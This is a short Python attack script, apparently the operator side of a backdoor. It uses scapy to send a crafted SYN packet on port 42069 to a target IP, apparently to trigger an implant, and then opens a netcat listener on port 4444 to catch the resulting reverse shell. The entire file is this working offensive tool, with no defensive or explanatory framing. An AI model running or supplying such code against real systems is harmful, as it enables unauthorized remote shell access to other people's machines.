from scapy.all import *
import threading
from time import sleep
from os import system
import sys

def send_init_packet(ip):
    sleep(2)
    packet = IP(dst=ip)/TCP(sport=42069, dport=42069, flags='S')
    send(packet, verbose=False)

def main():
    args = sys.argv
    if len(args) < 2:
        print("Please provide IP")
        return
    thread = threading.Thread(target=send_init_packet, args=(args[1],))
    thread.start()
    system("nc -nlvp 4444")

if __name__ == "__main__":
    main()
